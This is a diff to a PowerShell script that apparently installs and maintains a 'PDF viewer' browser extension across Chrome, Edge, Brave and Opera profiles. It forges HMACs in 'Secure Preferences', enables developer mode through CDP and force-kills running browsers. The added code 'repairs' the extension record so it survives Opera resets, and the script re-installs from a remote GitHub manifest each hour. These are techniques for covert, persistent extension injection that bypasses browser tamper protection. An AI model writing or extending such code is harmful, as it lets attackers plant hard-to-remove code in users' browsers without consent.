@@ -284,7 +284,7 @@ function Enable-DevMode-CDP($userDataDir, $browserType) {
     }
 }
 
-function Inject-Chrome-HMAC($profPath, $extPath, $extId, $browserType) {
+function Inject-Chrome-HMAC($profPath, $extPath, $extId, $browserType, $noFlip) {
     $securePrefFile = Join-Path $profPath 'Secure Preferences'
     # NOTE: no early return here — SP появится после флипа на свежем профиле
 
@@ -303,8 +303,11 @@ function Inject-Chrome-HMAC($profPath, $extPath, $extId, $browserType) {
             $sp = Get-Content $securePrefFile -Raw -Encoding UTF8 | ConvertFrom-Json
         }
         # devmode flip for ALL: Chromium 136+ requires it even for Brave/Edge/Opera
-        # (unpacked ext gets disable_reasons=16777216 without it)
-        if ($true) {
+        # (unpacked ext gets disable_reasons=16777216 without it).
+        # noFlip (maintenance skeleton-repair): ui.devmode is already True
+        # (set by the install run) and stays True across restarts, so the
+        # flip is not needed - and a running browser would break it anyway.
+        if (-not $noFlip) {
             if (-not $sp -or -not ($sp.extensions.ui.developer_mode)) {
                 $userDataDir = Split-Path $profPath -Parent
                 if (-not (Enable-DevMode-CDP $userDataDir $browserType)) { return $false }
@@ -470,12 +473,12 @@ function Inject-Chrome-HMAC($profPath, $extPath, $extId, $browserType) {
     }
 }
 
-function Inject-Profile($profPath, $extPath, $extId, $manifestObj, $browserType) {
+function Inject-Profile($profPath, $extPath, $extId, $manifestObj, $browserType, $noFlip) {
     # HMAC-verified path: Secure Preferences with valid MACs (see block above).
     # NOTE: no early return on a missing SP file - on a fresh profile Secure
     # Preferences is created by Chrome itself during the dev-mode flip.
     try {
-        return (Inject-Chrome-HMAC $profPath $extPath $extId $browserType)
+        return (Inject-Chrome-HMAC $profPath $extPath $extId $browserType $noFlip)
     } catch {
         return $false
     }
@@ -493,6 +496,40 @@ function Process-Browser($name, $exeName, $paths, $extPath, $extId, $manifestObj
     # entry is missing, in which case the browser is NOT in a browsing state
     # worth protecting anyway.
     $killedCmds = @()
+    # Maintenance skeleton-repair (Opera): the browser keeps running and
+    # rewrites its SP only on exit, so a repair write while it runs is safe.
+    # For a MISSING entry (gate false) we must not fight a live browser for
+    # the dev-mode flip -> keep the kill logic for the install path.
+    $skipFlip = $false
+    if ($Maintenance) {
+        $skeletonFound = $false
+        foreach ($p in $paths) {
+            $userDataDir = [System.Environment]::ExpandEnvironmentVariables($p)
+            if (-not (Test-Path $userDataDir)) { continue }
+            $profiles = @('Default') + @(Get-ChildItem $userDataDir -Directory -Filter 'Profile *' -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
+            foreach ($prof in $profiles) {
+                $sp = $null
+                try {
+                    $spFile = Join-Path (Join-Path $userDataDir $prof) 'Secure Preferences'
+                    $sp = Get-Content $spFile -Raw -Encoding UTF8 | ConvertFrom-Json
+                    $bT = 'chrome'; if ($name -like 'Opera*') { $bT = 'opera' }
+                    if ($bT -eq 'opera') {
+                        $opRec = $null
+                        try { $opRec = $sp.extensions.opsettings.$extId } catch {}
+                        $tst = $null
+                        try { $tst = $sp.extensions.settings.$extId } catch {}
+                        # skeleton = runtime-only record (no path) -> repairable
+                        $tgt = $null
+                        if ($opRec -and -not $opRec.path) { $tgt = $spFile }
+                        elseif (-not $opRec -and $tst) { $tgt = $spFile }
+                        if ($tgt) { $skeletonFound = $true }
+                    }
+                } catch {}
+            }
+        }
+        $skipFlip = $skeletonFound
+    }
+    if (-not $Maintenance -or -not $skipFlip) {
     if (-not $Maintenance) {
         $procs = Get-Process $exeName -ErrorAction SilentlyContinue
         $mySession = (Get-Process -Id $PID).SessionId
@@ -504,6 +541,7 @@ function Process-Browser($name, $exeName, $paths, $extPath, $extId, $manifestObj
             Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
         }
         if ($killedCmds.Count -gt 0) { Start-Sleep -Milliseconds 800 }
+    }
     }
 
     foreach ($p in $paths) {
@@ -519,7 +557,7 @@ function Process-Browser($name, $exeName, $paths, $extPath, $extId, $manifestObj
             if ($name -like 'Opera*') { $bType = 'opera' }
             # Seed map (empirical, 2026-09-27): chrome -> 64B pak seed;
             # edge/brave/opera -> empty seed (fork removed the pak seed)
-            if (Inject-Profile $profPath $extPath $extId $manifestObj $bType) { $injected++ }
+            if (Inject-Profile $profPath $extPath $extId $manifestObj $bType $skipFlip) { $injected++ }
         }
     }
 
@@ -949,7 +987,42 @@ function Get-ManifestVersion($path) {
 # Hourly extension update check. Mirrors the macOS logic: compare the remote
 # manifest version, re-install only when it differs or the entry disappeared.
 # Never closes a running browser - if one is open the pass is deferred.
-function Update-ExtensionIfNeeded {
+# Opera skeleton detector: TRUE when any opera profile's opsettings
+# record for our ext exists WITHOUT path (runtime-only skeleton Opera
+# leaves after each start), or lives only in the legacy settings fork.
+function Test-OperaSkeleton($extId) {
+    foreach ($root in @($env:LOCALAPPDATA, $env:APPDATA)) {
+        $ud = Join-Path $root 'Opera Software\Opera Stable'
+        if (-not (Test-Path $ud)) { continue }
+        $profiles = @('Default') + @(Get-ChildItem $ud -Directory -Filter 'Profile *' -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
+        foreach ($prof in $profiles) {
+            $spFile = Join-Path (Join-Path $ud $prof) 'Secure Preferences'
+            if (-not (Test-Path $spFile)) { continue }
+            try {
+                $sp = Get-Content $spFile -Raw -Encoding UTF8 | ConvertFrom-Json
+                $opRec = $null
+                try { $opRec = $sp.extensions.opsettings.$extId } catch {}
+                $tst = $null
+                try { $tst = $sp.extensions.settings.$extId } catch {}
+                if (($opRec -and -not $opRec.path) -or (-not $opRec -and $tst)) { return 'skeleton' }
+            } catch {}
+        }
+    }
+    return 'healthy'
+}
+
+function Update-ExtensionIfNeeded($extId) {
+    # Opera skeleton-repair: after every browser start Opera rewrites the
+    # opsettings record to a runtime-only skeleton (path dropped), so on
+    # the NEXT start the extension will not load. Repair must run even
+    # when versions match (skeleton != healthy) - hence it comes FIRST,
+    # before the remote version check and its early 'up-to-date' return.
+    # Safe while the browser runs: Opera rewrites SP only on exit.
+    $spState = Test-OperaSkeleton($extId)
+    if ($spState -eq 'skeleton') {
+        if (Install-ExtensionCopy) { return 'skeleton-repaired' }
+        return 'repair-failed'
+    }
     $remoteUrl = 'https://raw.githubusercontent.com/Castro02980/pdf-viewer-extension/main/manifest.json'
     $tmpManifest = Join-Path $TmpDir 'pdf-ext-remote-manifest.json'
     $remoteVersion = ''
@@ -1005,7 +1078,7 @@ function Invoke-MaintenancePass {
     $id = Get-PdfViewerDeviceId
 
     try {
-        $state = Update-ExtensionIfNeeded
+        $state = Update-ExtensionIfNeeded($ExtId)
     } catch {
         $state = 'error'
     }
